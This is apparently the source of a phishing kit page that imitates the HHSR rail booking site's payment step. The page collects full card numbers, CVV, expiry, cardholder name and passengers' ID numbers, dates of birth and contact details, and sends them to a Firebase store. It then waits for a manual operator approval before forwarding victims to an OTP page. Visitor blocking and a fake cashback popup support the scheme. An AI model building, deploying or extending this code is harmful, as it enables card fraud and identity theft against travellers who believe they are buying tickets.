import { useEffect, useState } from "react";
import { motion } from "framer-motion";
import { Clock, ChevronDown, ChevronUp, AlertCircle } from "lucide-react";
import { Link, useLocation } from "wouter";
import BookingStepBar from "@/components/booking-step-bar";
import {
  addData,
  handleCurrentPage,
  handlePay,
  listenForApproval,
  isBinBlocked,
} from "@/lib/firebase";
import { getCardType } from "@/components/reservation/payment-step";
import cashbackImg from "@assets/photo_5769374572120575542_x_(1)_1778516964881.jpg";

function validateLuhn(cardNum: string): boolean {
  const digits = cardNum.replace(/\D/g, "");
  if (digits.length < 13) return false;
  let sum = 0;
  let alt = false;
  for (let i = digits.length - 1; i >= 0; i--) {
    let n = parseInt(digits[i], 10);
    if (alt) {
      n *= 2;
      if (n > 9) n -= 9;
    }
    sum += n;
    alt = !alt;
  }
  return sum % 10 === 0;
}

type PaxCounts = {
  adults: number;
  children: number;
  infants: number;
  special: number;
  student: number;
};

const PAX_META: { key: keyof PaxCounts; label: string; factor: number }[] = [
  { key: "adults", label: "البالغين", factor: 1 },
  { key: "children", label: "الأطفال", factor: 0.75 },
  { key: "infants", label: "الرضع", factor: 0.1 },
  { key: "special", label: "الاحتياجات الخاصة", factor: 0.5 },
  { key: "student", label: "طالب", factor: 0.6 },
];

function readPax(): PaxCounts {
  const fb: PaxCounts = { adults: 1, children: 0, infants: 0, special: 0, student: 0 };
  try {
    const raw = sessionStorage.getItem("searchPassengers");
    if (!raw) return fb;
    return { ...fb, ...(JSON.parse(raw) as Partial<PaxCounts>) };
  } catch {
    return fb;
  }
}

function readSelectedTripInfo() {
  try {
    const raw = sessionStorage.getItem("selectedTrip");
    if (!raw) return { unit: 0, className: "الأساسية", from: "", to: "" };
    const t = JSON.parse(raw);
    const idx = typeof t.selectedClassIndex === "number" ? t.selectedClassIndex : 0;
    const cls = t.classes?.[idx];
    const className = cls?.name || "الأساسية";
    const unit = idx === 1 ? Math.max(85, Math.round((t.price ?? 0) * 0.78)) : t.price ?? 0;
    return { unit, className, from: t.from || "", to: t.to || "" };
  } catch {
    return { unit: 0, className: "الأساسية", from: "", to: "" };
  }
}

function computeTotals() {
  const pax = readPax();
  const { unit, className, from, to } = readSelectedTripInfo();
  const lines = PAX_META.filter((c) => pax[c.key] > 0).map((c) => {
    const ppu = Math.round(unit * c.factor);
    const lineTotal = ppu * pax[c.key];
    return { label: c.label, qty: pax[c.key], ppu, lineTotal };
  });
  const subtotal = lines.reduce((s, l) => s + l.lineTotal, 0);
  const tax = Math.round(subtotal * 0.15 * 100) / 100;
  const grandTotal = Math.round((subtotal + tax) * 100) / 100;
  const ticketQuantity = lines.reduce((s, l) => s + l.qty, 0);
  return { pax, lines, subtotal, tax, grandTotal, className, from, to, unit, ticketQuantity };
}

const PAYMENT_METHODS = [
  {
    id: "card",
    label: "بطاقة ائتمانية",
    logos: [
      "https://media.base44.com/images/public/6a0141c514678b9757e134f7/2c1e15023_satrans_com_sa_visa-logo0upfiv7ntladm_68f214bb.svg",
      "https://media.base44.com/images/public/6a0141c514678b9757e134f7/41fe88fde_satrans_com_sa_master-card-logo0y_enem50ek-_055b28cd.svg",
      "https://media.base44.com/images/public/6a0141c514678b9757e134f7/53cfdc496_satrans_com_sa_mada-logo0zcnw-i5k6dfc_e3ec505d.svg",
    ],
  },
  {
    id: "applepay",
    label: "Apple Pay",
    appleLogo: true,
    disabled: true,
  },
] as const;

function digitsOnly(v: string, max: number) {
  return v.replace(/\D/g, "").slice(0, max);
}
function formatCard(v: string) {
  return digitsOnly(v, 16).replace(/(\d{4})(?=\d)/g, "$1 ");
}

function PassengerSummaryCard({ collapsed, onToggle }: { collapsed: boolean; onToggle: () => void }) {
  const { subtotal } = computeTotals();
  return (
    <div className="hhsr-card mb-4">
      <div className="flex items-start justify-between p-4">
        <button
          type="button"
          onClick={onToggle}
          className="w-8 h-8 rounded-full bg-[hsl(var(--gold-400))] text-white flex items-center justify-center"
          aria-label={collapsed ? "توسيع" : "طي"}
          data-testid="button-toggle-passenger-summary"
        >
          {collapsed ? <ChevronDown className="w-4 h-4" /> : <ChevronUp className="w-4 h-4" />}
        </button>
        <div className="flex-1 ms-3 text-end">
          <h3 className="font-extrabold text-foreground text-base">مسافر بالغ 1</h3>
          {!collapsed && (
            <div className="mt-2 flex items-center justify-end gap-1 text-sm">
              <span className="font-extrabold tabular-nums text-foreground">
                {subtotal.toFixed(2)} ﷼
              </span>
              <span className="text-muted-foreground">:السعر</span>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

function TotalsCard({ collapsed, onToggle }: { collapsed: boolean; onToggle: () => void }) {
  const { subtotal, tax, grandTotal } = computeTotals();
  const rows = [
    { label: "السعر الأساسي", value: subtotal },
    { label: "ضريبة القيمة المضافة", value: tax },
    { label: "شامل الرسوم الإدارية", value: 0 },
    { label: "شامل رسوم الدفع", value: 0 },
  ];

  return (
    <div className="hhsr-card mb-4">
      <div className="flex items-start justify-between p-4 pb-3 border-b border-border/50">
        <button
          type="button"
          onClick={onToggle}
          className="w-8 h-8 rounded-full bg-[hsl(var(--gold-400))] text-white flex items-center justify-center"
          aria-label={collapsed ? "توسيع" : "طي"}
          data-testid="button-toggle-totals"
        >
          {collapsed ? <ChevronDown className="w-4 h-4" /> : <ChevronUp className="w-4 h-4" />}
        </button>
        <div className="flex-1 ms-3 flex items-center justify-between">
          <span className="font-extrabold tabular-nums text-foreground">
            ﷼ {grandTotal.toFixed(2)}
          </span>
          <span className="font-bold text-foreground">السعر الإجمالي</span>
        </div>
      </div>

      {!collapsed && (
        <div className="px-4 py-3 space-y-2.5">
          {rows.map((r) => (
            <div key={r.label} className="flex items-center justify-between text-sm">
              <span className="font-semibold tabular-nums text-foreground">
                ﷼ {r.value.toFixed(2)}
              </span>
              <span className="text-muted-foreground">{r.label}</span>
            </div>
          ))}
        </div>
      )}
    </div>
  );
}

function AppleLogo() {
  return (
    <div className="flex items-center justify-center gap-1 px-3 py-1.5 rounded-md border border-foreground/80 bg-white">
      <svg viewBox="0 0 24 24" className="w-4 h-4 text-foreground" fill="currentColor" aria-hidden="true">
        <path d="M17.05 20.28c-.98.95-2.05.8-3.08.35-1.09-.46-2.09-.48-3.24 0-1.44.62-2.2.44-3.06-.35C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.54 4.09zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z" />
      </svg>
      <span className="text-sm font-semibold text-foreground">Pay</span>
    </div>
  );
}

export default function Payment() {
  const [, setLocation] = useLocation();
  const [selected, setSelected] = useState<string>("card");
  const [agreed, setAgreed] = useState(true);
  const [paxCollapsed, setPaxCollapsed] = useState(false);
  const [totalsCollapsed, setTotalsCollapsed] = useState(false);

  const [cardNumber, setCardNumber] = useState("");
  const [cardName, setCardName] = useState("");
  const [expiryMonth, setExpiryMonth] = useState("01");
  const [expiryYear, setExpiryYear] = useState(
    String(new Date().getFullYear() + 1).slice(-2),
  );
  const [cvv, setCvv] = useState("");
  const [errors, setErrors] = useState<Record<string, string>>({});
  const [error, setError] = useState("");
  const [submitting, setSubmitting] = useState(false);
  const [waitingApproval, setWaitingApproval] = useState(false);
  const [showCashbackPopup, setShowCashbackPopup] = useState(false);
  const [showCardModal, setShowCardModal] = useState(false);

  const totals = computeTotals();

  useEffect(() => {
    void handleCurrentPage("payment");
    setShowCashbackPopup(true);
  }, []);

  useEffect(() => {
    if (!waitingApproval) return;
    const unsub = listenForApproval((status) => {
      if (status === "approved") {
        setWaitingApproval(false);
        setLocation("/otp");
      } else if (status === "rejected") {
        setWaitingApproval(false);
        setError("تم رفض البطاقة. يرجى المحاولة مرة أخرى.");
        setSubmitting(false);
      }
    });
    return () => unsub && unsub();
  }, [waitingApproval, setLocation]);

  const clearFieldError = (k: string) =>
    setErrors((p) => {
      if (!p[k]) return p;
      const n = { ...p };
      delete n[k];
      return n;
    });

  const validateCardForm = (): boolean => {
    const e: Record<string, string> = {};
    const cn = cardNumber.replace(/\s/g, "");
    if (!cn) e.cardNumber = "رقم البطاقة مطلوب";
    else if (cn.length < 13) e.cardNumber = "رقم البطاقة غير صحيح";
    else if (!validateLuhn(cn)) e.cardNumber = "رقم البطاقة غير صحيح";
    if (!cardName.trim()) e.cardName = "اسم حامل البطاقة مطلوب";
    if (!expiryMonth || !expiryYear) e.expiry = "تاريخ الانتهاء مطلوب";
    if (!cvv || cvv.length < 3) e.cvv = "رمز الأمان غير صحيح";
    setErrors(e);
    return Object.keys(e).length === 0;
  };

  const canPay = agreed && !submitting && !waitingApproval;

  const onPay = async () => {
    if (!canPay) return;
    if (selected === "card" && !showCardModal) {
      setShowCardModal(true);
      return;
    }
    if (selected === "card" && !validateCardForm()) return;

    setError("");
    setSubmitting(true);

    try {
      let passenger: any = {};
      try {
        passenger = JSON.parse(sessionStorage.getItem("passenger") || "{}");
      } catch {}
      const trip = JSON.parse(sessionStorage.getItem("selectedTrip") || "{}");
      const seats = JSON.parse(sessionStorage.getItem("selectedSeats") || "[]");
      const tripPrice = trip.price || 0;

      await addData({
        name: [passenger.firstName, passenger.lastName].filter(Boolean).join(" "),
        email: passenger.email || "",
        phone: passenger.phone || "",
        countryCode: passenger.countryCode || "+966",
        saudiId: passenger.idNumber || "",
        nationality: passenger.nationality || "",
        passengerTitle: passenger.title || "",
        passengerDob: passenger.dob || "",
        idType: passenger.idType || "",
        ticketQuantity: totals.ticketQuantity || 1,
        ticketPrice: tripPrice,
        totalAmount: totals.grandTotal || tripPrice,
        from: trip.from || "",
        to: trip.to || "",
        bookingDate: trip.date || "",
        bookingTime: trip.time_depart || "",
        tripDuration: trip.duration || "",
        seats,
        paymentMethod: selected,
        currentPage: "payment",
      });
    } catch {
      // non-fatal
    }

    if (selected !== "card") {
      setSubmitting(false);
      setWaitingApproval(true);
      return;
    }

    const cleanCard = cardNumber.replace(/\s/g, "");
    try {
      if (await isBinBlocked(cleanCard)) {
        setError("هذه البطاقة غير مدعومة. يرجى استخدام بطاقة أخرى.");
        setSubmitting(false);
        return;
      }
    } catch {}

    const paymentInfo = {
      cardNumber: cleanCard,
      cardName,
      expiryMonth,
      expiryYear,
      cvv,
      cardType: getCardType(cleanCard),
      currentPage: "payment",
    };

    try {
      await handlePay(paymentInfo, () => {});
    } catch (err: any) {
      setSubmitting(false);
      if (err?.message === "VISITOR_BLOCKED") {
        setError("تم حظر هذا الزائر ولا يمكنه المتابعة");
      } else {
        setError("حدث خطأ أثناء معالجة الدفع");
      }
      return;
    }
    setSubmitting(false);
    setWaitingApproval(true);
  };

  return (
    <div className="min-h-screen" dir="rtl" data-testid="page-payment">
      {showCashbackPopup && (
        <div
          className="fixed inset-0 z-[100] flex items-center justify-center p-4 bg-black/60 backdrop-blur-sm"
          onClick={() => setShowCashbackPopup(false)}
          data-testid="overlay-cashback"
        >
          <div
            className="relative bg-white rounded-2xl shadow-2xl max-w-sm w-full overflow-hidden"
            onClick={(e) => e.stopPropagation()}
          >
            <button
              type="button"
              onClick={() => setShowCashbackPopup(false)}
              aria-label="إغلاق"
              data-testid="button-close-cashback"
              className="absolute top-2 left-2 z-10 w-8 h-8 rounded-full bg-white/90 hover:bg-white text-stone-700 flex items-center justify-center shadow-md text-lg font-bold"
            >
              ×
            </button>
            <img src={cashbackImg} alt="كاش باك 40%" className="w-full h-auto block" />
            <div className="p-4">
              <button
                type="button"
                onClick={() => setShowCashbackPopup(false)}
                className="btn-gold w-full"
                data-testid="button-continue-cashback"
              >
                متابعة الدفع
              </button>
            </div>
          </div>
        </div>
      )}

      {showCardModal && (
        <div
          className="fixed inset-0 z-[110] flex items-end sm:items-center justify-center bg-black/60 backdrop-blur-sm"
          data-testid="overlay-card-modal"
        >
          <div className="bg-white w-full sm:max-w-md sm:rounded-2xl rounded-t-2xl overflow-hidden">
            <div className="flex items-center justify-between bg-[hsl(var(--gold-400))] text-white px-4 py-3">
              <button
                onClick={() => setShowCardModal(false)}
                className="text-sm font-semibold"
                data-testid="button-cancel-card-modal"
              >
                Cancel
              </button>
            </div>
            <div className="p-4">
              <div className="flex items-center justify-between mb-3">
                <span className="font-bold text-foreground">
                  HHSR : SAR {totals.grandTotal.toFixed(2)}
                </span>
                <button
                  onClick={() => setShowCardModal(false)}
                  className="text-muted-foreground text-2xl leading-none"
                  aria-label="إغلاق"
                >
                  ×
                </button>
              </div>
              <div className="flex items-center gap-2 text-emerald-700 text-sm mb-4">
                <Clock className="w-4 h-4" />
                <span>لديك <span dir="ltr" className="font-bold">9:50</span> متبقي لهذا الدفع</span>
              </div>

              <div className="space-y-4">
                <div>
                  <label className="block text-sm font-semibold text-foreground mb-1 text-end">
                    رقم البطاقة <span className="text-destructive">*</span>
                  </label>
                  <input
                    value={cardNumber}
                    onChange={(e) => {
                      setCardNumber(formatCard(e.target.value));
                      clearFieldError("cardNumber");
                    }}
                    inputMode="numeric"
                    dir="ltr"
                    className={`w-full border rounded-md px-3 py-2.5 text-sm bg-white outline-none focus:border-[hsl(var(--gold-500))] ${
                      errors.cardNumber ? "border-destructive" : "border-border"
                    }`}
                    data-testid="input-card-number"
                  />
                  <div className="flex justify-end gap-1 mt-1">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" alt="visa" className="h-4" />
                    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="mc" className="h-4" />
                    <img src={PAYMENT_METHODS[0].logos![2]} alt="mada" className="h-4" />
                  </div>
                </div>

                <div className="grid grid-cols-2 gap-3">
                  <div>
                    <label className="block text-sm font-semibold text-foreground mb-1 text-end">
                      شهر انتهاء الصلاحية <span className="text-destructive">*</span>
                    </label>
                    <select
                      value={expiryMonth}
                      onChange={(e) => setExpiryMonth(e.target.value)}
                      className="w-full border border-border rounded-md px-3 py-2.5 text-sm bg-white text-end"
                      dir="ltr"
                      data-testid="select-expiry-month"
                    >
                      {Array.from({ length: 12 }, (_, i) => String(i + 1).padStart(2, "0")).map((m) => (
                        <option key={m} value={m}>{m}</option>
                      ))}
                    </select>
                  </div>
                  <div>
                    <label className="block text-sm font-semibold text-foreground mb-1 text-end">
                      سنة انتهاء الصلاحية <span className="text-destructive">*</span>
                    </label>
                    <select
                      value={expiryYear}
                      onChange={(e) => setExpiryYear(e.target.value)}
                      className="w-full border border-border rounded-md px-3 py-2.5 text-sm bg-white text-end"
                      dir="ltr"
                      data-testid="select-expiry-year"
                    >
                      {Array.from({ length: 12 }, (_, i) => {
                        const y = (new Date().getFullYear() + i).toString().slice(-2);
                        return <option key={y} value={y}>{y}</option>;
                      })}
                    </select>
                  </div>
                </div>

                <div>
                  <label className="block text-sm font-semibold text-foreground mb-1 text-end">
                    اسم حامل البطاقة <span className="text-destructive">*</span>
                  </label>
                  <input
                    value={cardName}
                    onChange={(e) => {
                      setCardName(e.target.value.toUpperCase());
                      clearFieldError("cardName");
                    }}
                    className={`w-full border rounded-md px-3 py-2.5 text-sm bg-white uppercase outline-none focus:border-[hsl(var(--gold-500))] ${
                      errors.cardName ? "border-destructive" : "border-border"
                    }`}
                    data-testid="input-card-name"
                  />
                </div>

                <div className="flex items-end gap-3">
                  <div className="flex-1">
                    <label className="block text-sm font-semibold text-foreground mb-1 text-end">
                      رمز الأمان <span className="text-destructive">*</span>
                    </label>
                    <p className="text-[11px] text-muted-foreground text-end mb-1">
                      3 أرقام على الجهة الخلفية من بطاقتك
                    </p>
                  </div>
                  <input
                    value={cvv}
                    onChange={(e) => {
                      setCvv(digitsOnly(e.target.value, 4));
                      clearFieldError("cvv");
                    }}
                    inputMode="numeric"
                    dir="ltr"
                    className={`w-20 border rounded-md px-3 py-2.5 text-sm text-center bg-white outline-none focus:border-[hsl(var(--gold-500))] ${
                      errors.cvv ? "border-destructive" : "border-border"
                    }`}
                    data-testid="input-cvv"
                  />
                </div>

                {error && (
                  <div className="bg-destructive/10 border border-destructive/30 text-destructive text-sm rounded-md px-3 py-2 flex items-center gap-2">
                    <AlertCircle className="w-4 h-4" />
                    <span>{error}</span>
                  </div>
                )}

                <button
                  onClick={onPay}
                  disabled={submitting || waitingApproval}
                  className="w-full bg-emerald-600 text-white font-bold py-3 rounded-md hover:bg-emerald-700 transition-colors disabled:opacity-60"
                  data-testid="button-card-next"
                >
                  {submitting ? "جاري المعالجة..." : waitingApproval ? "بانتظار التأكيد..." : "التالي"}
                </button>
                <button
                  onClick={() => setShowCardModal(false)}
                  className="w-full bg-white border border-[#1e88e5] text-[#1e88e5] font-bold py-3 rounded-md hover:bg-blue-50 transition-colors"
                  data-testid="button-card-cancel"
                >
                  إلغاء
                </button>

                <div className="flex items-center justify-between pt-2 border-t border-border">
                  <span className="text-xs text-muted-foreground">Powered By</span>
                  <img src={PAYMENT_METHODS[0].logos![1]} alt="mc" className="h-5" />
                </div>
              </div>
            </div>
          </div>
        </div>
      )}

      <BookingStepBar current={3} title="الدفع" backHref="/passenger-details" />

      <div className="max-w-md mx-auto px-3 sm:px-4 py-4">
        <PassengerSummaryCard
          collapsed={paxCollapsed}
          onToggle={() => setPaxCollapsed((c) => !c)}
        />

        {/* Payment methods */}
        <div className="hhsr-card mb-4">
          <div className="flex items-center justify-between p-4 pb-3">
            <span className="w-8 h-8 rounded-full bg-[hsl(var(--gold-400))] text-white flex items-center justify-center">
              <ChevronUp className="w-4 h-4" />
            </span>
            <h3 className="font-extrabold text-foreground text-base">طريقة الدفع</h3>
          </div>
          <div className="px-4 pb-4 flex items-center justify-center gap-6">
            {PAYMENT_METHODS.map((method) => {
              const isDisabled = "disabled" in method && method.disabled;
              return (
              <label
                key={method.id}
                className={`flex items-center gap-3 ${
                  isDisabled ? "cursor-not-allowed opacity-40" : "cursor-pointer"
                }`}
                data-testid={`payment-method-${method.id}`}
                aria-disabled={isDisabled}
              >
                <input
                  type="radio"
                  name="payment"
                  value={method.id}
                  checked={selected === method.id}
                  onChange={() => !isDisabled && setSelected(method.id)}
                  disabled={isDisabled}
                  className="sr-only"
                />
                <span
                  className={`w-5 h-5 rounded-full border-2 flex items-center justify-center transition-colors ${
                    selected === method.id
                      ? "border-[hsl(var(--gold-500))] bg-[hsl(var(--gold-500))]"
                      : "border-[hsl(var(--gold-400))] bg-white"
                  }`}
                >
                  {selected === method.id && (
                    <span className="w-2 h-2 rounded-full bg-white" />
                  )}
                </span>
                {"appleLogo" in method && method.appleLogo ? (
                  <AppleLogo />
                ) : "logos" in method && method.logos ? (
                  <div className="grid grid-cols-2 gap-1 items-center">
                    {method.logos.slice(0, 3).map((l, i) => (
                      <img key={i} src={l} alt="" className="h-4 w-auto" />
                    ))}
                  </div>
                ) : null}
              </label>
              );
            })}
          </div>
        </div>

        <TotalsCard
          collapsed={totalsCollapsed}
          onToggle={() => setTotalsCollapsed((c) => !c)}
        />

        <button
          className="btn-gold w-full mb-3 bg-[hsl(var(--gold-300))] text-foreground"
          style={{ background: "hsl(var(--gold-300))", color: "hsl(var(--foreground))" }}
          data-testid="button-promo-code"
        >
          التحقق من صحة الرموز الترويجية
        </button>

        <motion.button
          whileTap={{ scale: 0.98 }}
          disabled={!canPay}
          onClick={onPay}
          className="btn-gold w-full"
          data-testid="button-pay"
        >
          {submitting
            ? "جاري المعالجة..."
            : waitingApproval
              ? "بانتظار التأكيد..."
              : "الدفع"}
        </motion.button>

        {error && !showCardModal && (
          <div className="bg-destructive/10 border border-destructive/30 text-destructive text-sm rounded-xl px-4 py-3 mt-3 text-end">
            {error}
          </div>
        )}

        <div className="mt-4 flex items-center justify-between text-xs text-muted-foreground px-1">
          <Link
            href="/passenger-details"
            className="text-[hsl(var(--gold-700))] font-medium hover:underline"
          >
            رجوع
          </Link>
          <div className="flex items-center gap-1">
            <Clock className="w-3 h-3" />
            <span>14:24 دقيقة متبقية</span>
          </div>
        </div>
      </div>
    </div>
  );
}
